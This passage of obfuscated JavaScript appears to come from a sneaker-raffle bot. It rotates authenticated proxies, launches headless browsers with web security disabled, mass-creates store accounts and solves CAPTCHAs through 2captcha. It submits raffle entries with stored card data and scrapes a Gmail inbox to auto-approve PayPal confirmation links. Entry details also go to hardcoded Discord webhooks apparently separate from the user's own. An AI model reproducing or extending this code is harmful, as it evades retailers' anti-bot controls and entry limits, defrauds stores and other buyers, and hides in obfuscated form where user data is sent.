            var _0x130602 = Math['round'](Math['random']() * (_0x187bbb()['length'] - 0x1)), _0x5ad73a = _0x187bbb()[_0x130602]['split'](':');
        const _0x329cc5 = await _0x51bd0a['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x5ad73a[0x0] + ':' + _0x5ad73a[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x33424a = await _0x329cc5['newPage']();
            await _0x33424a['authenticate']({
                'username': '' + _0x5ad73a[0x2],
                'password': '' + _0x5ad73a[0x3]
            }), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x33424a['setRequestInterception'](!![]), _0x33424a['on']('request', _0x2e2f7d => {
                _0x2e2f7d['resourceType']() === 'image' || _0x2e2f7d['resourceType']() === 'font' || _0x2e2f7d['resourceType']() === 'media' ? _0x2e2f7d['abort']() : _0x2e2f7d['continue']();
            }), await _0x33424a['goto'](_0x2747df), await _0x90116b(0xbb8), await _0x33424a['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Filling\x20information'), await _0x33424a['type']('#RegisterForm-FirstName', '' + bouncewear[_0x40afb0]['FirstName']), await _0x90116b(0x226), await _0x33424a['type']('#RegisterForm-LastName', '' + bouncewear[_0x40afb0]['LastName']), await _0x90116b(0x226), await _0x33424a['type']('#RegisterForm-email', '' + bouncewear[_0x40afb0]['Email']), await _0x90116b(0x226), await _0x33424a['type']('#RegisterForm-password', '' + bouncewear[_0x40afb0]['Password']), await _0x90116b(0x226), await _0x33424a['click']('#marketing'), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Submitting..'), await _0x33424a['$eval']('#RegisterForm', _0x115619 => _0x115619['submit']()), await _0x90116b(0x1f40), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x33424a['solveRecaptchas'](), await _0x33424a['click']('.shopify-challenge__button.btn');
            async function _0xa86d2f() {
                for (var _0x2d98bf = 0x0; _0x2d98bf < 0x4; _0x2d98bf++) {
                    try {
                        console['log']('try'), await _0x33424a['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20' + _0x5bbbd3['red']('Catpcha\x20failed,\x20retrying..')), await _0x33424a['solveRecaptchas'](), await _0x33424a['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0xa86d2f(), console['log'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x90116b(0x1f4);
            try {
                await _0x33424a['waitForSelector']('.featured-title'), await _0x90116b(0x1f4), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40afb0]['Email'] + '\x20Generated!')), _0x396fe9['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x40afb0]['Email'] + ',' + bouncewear[_0x40afb0]['Password']), console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x23f2c0['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x40afb0]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x4e462b) {
                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4e462b));
            }
        } catch (_0x1fcccc) {
            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20' + _0x1fcccc));
        } finally {
            _0x329cc5 && _0x329cc5['close'](), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
        }
    }
}
async function _0x26c687(_0x133ced, _0x3cf474, _0x2c12ad) {
    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x474e1d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x2dfc54 = 0x0; _0x2dfc54 < _0x3cf474['length']; _0x2dfc54++) {
        _0x4e8779(_0x133ced['name'] + '\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20/\x20' + _0x3cf474['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
        var _0x76cea0 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54e6a5
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3cf474[_0x2dfc54]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3cf474[_0x2dfc54]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x474e1d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x474e1d['version']
                }
            ]
        }];
        const _0xbc16f9 = { 'embeds': _0x76cea0 };
        await _0x526adb(_0x3cf474, _0x2dfc54);
        if (_0x3cf474[_0x2dfc54]['Email'] == '' || _0x3cf474[_0x2dfc54]['Password'] == '' || _0x3cf474[_0x2dfc54]['FirstName'] == '' || _0x3cf474[_0x2dfc54]['LastName'] == '') {
            console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x3cf474[_0x2dfc54]['Password'] == '' || _0x3cf474[_0x2dfc54]['Password'] == undefined) && (_0x3cf474[_0x2dfc54]['Password'] = 'ErehsaWonRaj1!');
        if (_0x474e1d['useRandomProxy'] = ![])
            var _0x4a1943 = _0x2c12ad[_0x2dfc54]['split'](':');
        else
            var _0x66b9a7 = Math['round'](Math['random']() * (_0x2c12ad['length'] - 0x1)), _0x4a1943 = _0x2c12ad[_0x66b9a7]['split'](':');
        const _0x126c26 = await _0x51bd0a['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4a1943[0x0] + ':' + _0x4a1943[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x9384ad = await _0x126c26['newPage']();
            await _0x9384ad['authenticate']({
                'username': '' + _0x4a1943[0x2],
                'password': '' + _0x4a1943[0x3]
            }), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9384ad['setRequestInterception'](!![]), _0x9384ad['on']('request', _0x530744 => {
                _0x530744['resourceType']() === 'image' || _0x530744['resourceType']() === 'font' || _0x530744['resourceType']() === 'media' ? _0x530744['abort']() : _0x530744['continue']();
            }), await _0x9384ad['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x9384ad['goto']('' + _0x3cf474[_0x2dfc54]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x9384ad['waitForSelector']('#btnPdpAtb'), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x3cf474[_0x2dfc54]['Size']);
            const _0x402930 = await _0x9384ad['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x39c5c2 => {
                return _0x39c5c2['map'](_0x10f64d => _0x10f64d['innerText']);
            }), _0x24ed9b = await _0x9384ad['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x32c804 = ![];
            if (_0x3cf474[_0x2dfc54]['Size'] == 'RANDOM') {
                var _0x5e7c40 = Math['round'](Math['random']() * (_0x24ed9b['length'] - 0x1));
                await _0x24ed9b[_0x5e7c40]['click']();
            } else
                for (var _0xcbf754 = 0x0; _0xcbf754 < _0x402930['length']; _0xcbf754++) {
                    if (_0x402930[_0xcbf754] != _0x3cf474[_0x2dfc54]['Size'])
                        continue;
                    try {
                        await _0x24ed9b[_0xcbf754]['click']();
                    } catch {
                        console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x32c804 = !![];
                    }
                }
            if (_0x32c804)
                continue;
            await _0x90116b(0x578), await _0x9384ad['click']('#btnPdpAtb'), await _0x9384ad['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x90116b(0x3e8), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x9384ad['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x9384ad['waitForSelector']('#email'), await _0x9384ad['type']('#email', _0x3cf474[_0x2dfc54]['Email']), await _0x90116b(0x226), await _0x9384ad['click']('#guest-submit'), await _0x90116b(0x1b58), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x9384ad['waitForSelector']('#firstname'), await _0x9384ad['type']('#firstname', _0x3cf474[_0x2dfc54]['FirstName'], 0x1f4), await _0x90116b(0x190), await _0x9384ad['waitForSelector']('#surname'), await _0x9384ad['type']('#surname', _0x3cf474[_0x2dfc54]['LastName'], 0x1f4), await _0x90116b(0x190), await _0x9384ad['waitForSelector']('#mobile'), await _0x9384ad['type']('#mobile', _0x3cf474[_0x2dfc54]['Phone'], 0x1f4), await _0x90116b(0x190), await _0x9384ad['click']('#enterManualDiv'), await _0x90116b(0x5dc), await _0x9384ad['waitForSelector']('#address1'), await _0x9384ad['type']('#address1', _0x3cf474[_0x2dfc54]['Address1'] + '\x20' + _0x3cf474[_0x2dfc54]['HouseNumber'], 0x226), await _0x90116b(0x384), await _0x9384ad['waitForSelector']('#address2'), await _0x9384ad['type']('#address2', '' + _0x3cf474[_0x2dfc54]['Address2'], 0x226), await _0x90116b(0x320);
            const _0x15b5df = await _0x9384ad['$$eval']('#countryselect_view3\x20>\x20option', _0x27b4d3 => {
                return _0x27b4d3['map'](_0x56bd98 => _0x56bd98['value']);
            });
            var _0x1f3f21;
            for (var _0x554ad9 = 0x0; _0x554ad9 < _0x15b5df['length']; _0x554ad9++) {
                if (_0x15b5df[_0x554ad9]['startsWith']('' + _0x3cf474[_0x2dfc54]['Country'])) {
                    _0x1f3f21 = _0x15b5df[_0x554ad9];
                    break;
                }
                continue;
            }
            await _0x9384ad['select']('#countryselect_view3', '' + _0x1f3f21), await _0x9384ad['waitForSelector']('#address4'), await _0x9384ad['type']('#address4', '' + _0x3cf474[_0x2dfc54]['City'], 0x1f4), await _0x90116b(0x384), await _0x9384ad['waitForSelector']('#postcode'), await _0x9384ad['type']('#postcode', '' + _0x3cf474[_0x2dfc54]['Zip'], 0x1f4), await _0x90116b(0x4b0);
            const _0x399c8e = await _0x9384ad['url']();
            console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x497395 = _0x399c8e['split']('?')[0x1], _0x1c9d99 = await _0x9384ad['$']('#co_address_submit');
            await _0x1c9d99['evaluate'](_0x9f08d => _0x9f08d['click']()), await _0x90116b(0x1388), await _0x9384ad['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x497395), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x9384ad['waitForSelector']('#paymentbuttons'), await _0x90116b(0x1388), await _0x9384ad['click']('#paymentbuttons\x20>\x20div'), await _0x90116b(0x1c2), await _0x9384ad['waitForSelector']('#card-number'), await _0x9384ad['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x54cee7 = await _0x9384ad['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x5e5991 = await _0x54cee7['contentFrame']();
            await _0x5e5991['waitForSelector']('.InputContainer'), await _0x5e5991['click']('.InputContainer\x20>\x20input'), await _0x90116b(0x578), await _0x9384ad['type']('#card-number', '' + _0x3cf474[_0x2dfc54]['CreditNumber']), await _0x90116b(0xfa), await _0x9384ad['type']('#card-expiry', '' + _0x3cf474[_0x2dfc54]['ExpiryDate']), await _0x90116b(0xfa), await _0x9384ad['type']('#card-cvc', '' + _0x3cf474[_0x2dfc54]['CVV']), await _0x90116b(0x7d0), await _0x9384ad['click']('#card-button'), console['log'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x9384ad['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x2860ef(_0x5e16d4, _0xbc16f9);
            } catch {
                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x203DS\x20Failed')), _0x76cea0[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x76cea0[0x0]['description'] = '3DS\x20Failed', await _0x2860ef(_0x406b45, _0xbc16f9);
            }
        } catch (_0x17e384) {
            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x133ced['name'] + ']\x20Task\x20' + (_0x2dfc54 + 0x1) + '\x20:\x20' + _0x17e384)), _0x76cea0[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x76cea0[0x0]['description'] = '' + _0x17e384, await _0x2860ef(_0x406b45, _0xbc16f9);
        } finally {
            _0x126c26 && _0x126c26['close']();
            if (_0x2dfc54 + 0x1 == _0x3cf474['length']) {
                console['log'](_0x5bbbd3['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x90116b(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x474e1d['AfewDelay'] + '\x20ms'), await _0x90116b(_0x474e1d['AfewDelay']);
        }
    }
}
async function _0x526826(_0x5ebe7e, _0x20eac6, _0x27fa35, _0x45c32c, _0x38b147) {
    var _0x52bc96, _0x35a7b6 = {}, _0x22d4cd = [], _0x195fa0 = {}, _0x458ec3 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x45c32c && (_0x45c32c = {});
    if (_0x20eac6 != 'ver') {
        _0x4e8779(_0x27fa35['name'] + '\x20Task\x20' + (_0x5ebe7e + 0x1) + '\x20/\x20' + _0x45c32c['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x45c32c, _0x5ebe7e), _0x22d4cd = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x54e6a5
                },
                {
                    'name': 'Size',
                    'value': '' + _0x45c32c[_0x5ebe7e]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x474e1d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x1144ef
                }
            ]
        }], _0x195fa0 = { 'embeds': _0x22d4cd }, _0x35a7b6 = _0x27fa35['data'];
        _0x20eac6 == 'exp' ? _0x35a7b6['data']['attributes']['email'] = '' + _0x45c32c[_0x5ebe7e]['FirstName'] + _0x45c32c[_0x5ebe7e]['LastName'] + _0x474e1d['catchall'] : _0x35a7b6['data']['attributes']['email'] = '' + _0x45c32c[_0x5ebe7e]['Email'];
        if (_0x45c32c[_0x5ebe7e]['Size'] == 'RANDOM') {
        }
        _0x35a7b6['data']['attributes']['properties']['$first_name'] = '' + _0x45c32c[_0x5ebe7e]['FirstName'], _0x35a7b6['data']['attributes']['properties']['$last_name'] = '' + _0x45c32c[_0x5ebe7e]['LastName'], _0x35a7b6['data']['attributes']['properties']['$address1'] = _0x45c32c[_0x5ebe7e]['Address1'] + '\x20' + _0x45c32c[_0x5ebe7e]['Address2'] + '\x20' + _0x45c32c[_0x5ebe7e]['HouseNumber'], _0x35a7b6['data']['attributes']['properties']['$zip'] = '' + _0x45c32c[_0x5ebe7e]['Zip'], _0x35a7b6['data']['attributes']['properties']['$city'] = '' + _0x45c32c[_0x5ebe7e]['City'], _0x35a7b6['data']['attributes']['properties']['$country'] = '' + _0x45c32c[_0x5ebe7e]['Country'], _0x35a7b6['data']['attributes']['properties']['Size'] = '' + _0x45c32c[_0x5ebe7e]['Size'], _0x35a7b6['data']['attributes']['properties']['$phone_number'] = '' + _0x45c32c[_0x5ebe7e]['Phone'], _0x35a7b6['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x45c32c[_0x5ebe7e]['Follower'];
    }
    if (_0x474e1d['useRandomProxy'] = ![])
        var _0x352713 = _0x38b147[_0x5ebe7e]['split'](':');
    else
        var _0x22f2cc = Math['round'](Math['random']() * (_0x38b147['length'] - 0x1)), _0x352713 = _0x38b147[_0x22f2cc]['split'](':');
    var _0x720974 = {
        'jar': _0x6f82fb,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x27fa35['url'],
        'headers': _0x27fa35['headers'],
        'body': JSON['stringify'](_0x35a7b6),
        'proxy': 'http://' + _0x352713[0x2] + ':' + _0x352713[0x3] + '@' + _0x352713[0x0] + ':' + _0x352713[0x1]
    };
    return _0x20eac6 != 'ver' && (_0x720974['url'] = _0x27fa35['url'], _0x720974['headers'] = _0x27fa35['headers']), _0x20eac6 == 'ver' && (_0x720974['method'] = 'GET'), new Promise(function (_0x15cc65, _0x174834) {
        callback = async (_0x3433c8, _0x554a0f, _0x17c716) => {
            if (!_0x3433c8 && _0x554a0f['statusCode'] == 0xca || !_0x3433c8 && _0x554a0f['statusCode'] == 0xc8) {
                if (_0x20eac6 != 'ver') {
                    var _0x11a93c = await _0x476a56(_0x45c32c[_0x5ebe7e], _0x27fa35, 'dev', ![]), _0x199300 = await _0x476a56(_0x45c32c[_0x5ebe7e], _0x27fa35, 'pub', ![]);
                    const _0x4821ed = {
                        'succesDEVMSG': { 'embeds': [_0x11a93c] },
                        'succesPUBMSG': { 'embeds': [_0x199300] }
                    };
                    if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                        try {
                            await _0x2860ef(_0x474e1d['webhook'], _0x4821ed['succesDEVMSG']);
                        } catch {
                        }
                    await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x4821ed['succesDEVMSG']), await _0x90116b(0xc8);
                    try {
                        await _0x2860ef(_0x3c50b7, _0x4821ed['succesPUBMSG']);
                    } catch {
                    }
                    _0x2812a5(_0x45c32c[_0x5ebe7e], _0x27fa35);
                }
                _0x15cc65(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x27fa35['name'] + ']\x20Task\x20' + (_0x5ebe7e + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x20eac6 != 'ver') {
                    var _0x2c5337 = '' + _0x3433c8, _0x3d4a5c = await _0x476a56(_0x45c32c[_0x5ebe7e], _0x27fa35, 'dev', !![], _0x2c5337), _0x5902ab = {};
                    _0x5902ab['errorDEV'] = { 'embeds': [_0x3d4a5c] }, _0x78fa55(_0x45c32c[_0x5ebe7e], _0x27fa35), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x5902ab['errorDEV']), await _0x2860ef(_0x406b45, _0x5902ab['errorDEV']);
                }
                _0x174834(console['log'](_0xd645bd() + '\x20[' + _0x27fa35['name'] + ']\x20Task\x20' + (_0x5ebe7e + 0x1) + ':\x20' + _0x3433c8));
            }
        };
        try {
            _0x20eac6 != 'ver' && console['log'](_0xd645bd() + '\x20[' + _0x27fa35['name'] + ']\x20Task\x20' + (_0x5ebe7e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x35a7b6['data']['attributes']['email']), _0x38301a(_0x720974, callback);
        } catch (_0x33284e) {
            console['log'](_0xd645bd() + '\x20Task\x20' + (_0x5ebe7e + 0x1) + ':\x20' + _0x33284e);
        }
    });
}
;
async function _0x453825(_0x30c72a, _0x5690e3, _0x3e0cbb) {
    var _0x30c72a = [];
    async function _0x5496b7() {
        var _0x20989a = new _0x59e93a({
            'user': _0x474e1d['masterMail'],
            'password': _0x474e1d['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x25b441(_0x3530bc) {
            _0x20989a['openBox']('INBOX', ![], _0x3530bc);
        }
        _0x20989a['once']('ready', function () {
            _0x25b441(function (_0x2d76b3, _0x564c84) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x2d76b3)
                    throw _0x2d76b3;
                _0x20989a['seq']['search'](['UNSEEN'], function (_0x2dc008, _0x28d9c4) {
                    if (!_0x28d9c4 || !_0x28d9c4['length'])
                        console['log'](_0xd645bd() + '\x20[' + _0x5690e3['name'] + ']\x20No\x20mails\x20found'), _0x20989a['end']();
                    else {
                        var _0x5c1255 = _0x20989a['seq']['fetch'](_0x28d9c4, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x5c1255['on']('message', function (_0x432beb, _0x3940da) {
                            var _0x6c1d0c = '(#' + _0x3940da + ')\x20';
                            _0x432beb['on']('body', function (_0x37c158, _0x2a2dc1) {
                                _0x2cd09b(_0x37c158, (_0x5c12bf, _0x5adba1) => {
                                    if (_0x5adba1['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x5adba1['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x5adba1['text']['split']('[')[0x2];
                                        var _0x4919b4 = mes['split'](']')[0x0];
                                        _0x30c72a['push'](_0x4919b4);
                                    }
                                });
                            }), _0x432beb['once']('end', function () {
                            });
                        }), _0x5c1255['once']('error', function (_0xce04d7) {
                            console['log']('Fetch\x20error:\x20' + _0xce04d7);
                        }), _0x5c1255['once']('end', function () {
                            _0x20989a['end']();
                        });
                    }
                });
            });
        }), _0x20989a['once']('error', function (_0x4fd43a) {
            console['log'](_0x5bbbd3['red'](_0x4fd43a['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x20989a['once']('end', async function () {
        }), _0x20989a['connect']();
    }
    try {
        _0x5496b7(), await _0x90116b(0xfa0), console['log']('Found\x20' + _0x30c72a['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
    }
    var _0x3f53e6;
    _0x4e8779('' + _0x5690e3);
    var _0x4123fa = _0x3e0cbb[0x0]['split'](':');
    const _0x241f42 = await _0x51bd0a['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x4123fa[0x0] + ':' + _0x4123fa[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Getting\x20Session');
        const _0x592bb8 = await _0x241f42['newPage']();
        await _0x592bb8['authenticate']({
            'username': '' + _0x4123fa[0x2],
            'password': '' + _0x4123fa[0x3]
        }), await _0x592bb8['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x592bb8, await _0x592bb8['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x592bb8['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Successfully\x20logged\x20in'), await _0x90116b(0x2710);
        } catch (_0x4d70e1) {
            throw new Error('Login\x20session\x20expired\x20' + _0x4d70e1);
        }
        for (var _0x229bcf = 0x0; _0x229bcf < _0x30c72a['length']; _0x229bcf++) {
            console['log'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Task\x20' + (_0x229bcf + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4e8779(_0x5690e3 + '\x20Task\x20' + (_0x229bcf + 0x1) + '\x20/\x20' + _0x30c72a['length']);
            const _0x42d9b3 = await _0x241f42['newPage']();
            await _0x42d9b3['goto']('' + _0x30c72a[_0x229bcf], { 'waitUntil': 'networkidle2' }), await _0x90116b(0xbb8);
            try {
                const _0x25bc9d = await _0x42d9b3['$']('#challenge-heading');
                _0x25bc9d && (console['log'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Task\x20' + (_0x229bcf + 0x1) + '\x20:\x20' + _0x5bbbd3['yellow']('2FA\x20Required')), await _0x42d9b3['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x90116b(0x61a8), await _0x42d9b3['waitForSelector']('#payment-submit-btn'), await _0x42d9b3['$eval']('#payment-submit-btn', _0x49f227 => _0x49f227['click']()), await _0x42d9b3['click']('#payment-submit-btn');
                try {
                    await _0x42d9b3['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x90116b(0x5dc), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Task\x20' + (_0x229bcf + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x49d40c) {
                    throw new Error('Payment\x20Rejected:\x20' + _0x49d40c['message']);
                } finally {
                    await _0x42d9b3['close'](), await _0x90116b(0x4650);
                }
            } catch (_0x366fe0) {
                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x5690e3 + ']\x20Task\x20' + (_0x229bcf + 0x1) + '\x20:\x20' + _0x366fe0));
            }
        }
    } catch (_0x35b1f0) {
        console['log'](_0x5bbbd3['red']('' + _0x35b1f0));
    } finally {
        await _0x241f42['close']();
    }
}
const _0x211f0b = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x232af5, _0x565f89, _0x48e14d) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x181d5e = 0x0; _0x181d5e < _0x565f89['length']; _0x181d5e++) {
                        if (_0x4692fe != 'yes')
                            var _0x4692fe = '', _0x206256 = 0x0;
                        var _0x4f3c5f;
                        await _0x526adb(_0x565f89, _0x181d5e), _0x4e8779(_0x232af5['name'] + '\x20Task\x20' + (_0x181d5e + 0x1) + '\x20/\x20' + _0x565f89['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc);
                        var _0x72f878 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x43c2eb = Math['round'](Math['random']() * (_0x72f878['length'] - 0x1));
                        _0x565f89[_0x181d5e]['Size'] == 'RANDOM' && (_0x565f89[_0x181d5e]['Size'] = _0x72f878[_0x43c2eb]);
                        var _0x157af8 = Math['round'](Math['random']() * (_0x48e14d['length'] - 0x1)), _0x40f062 = _0x48e14d[_0x157af8]['split'](':'), _0x1dcc16;
                        try {
                            _0x1dcc16 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x40f062[0x0] + ':' + _0x40f062[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1dcc16 = await _0x51bd0a['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x40f062[0x0] + ':' + _0x40f062[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0xd645bd() + '\x20[' + _0x232af5['name'] + ']\x20Task\x20' + (_0x181d5e + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x415a47 = await _0x1dcc16['newPage']();
                            await _0x415a47['authenticate']({
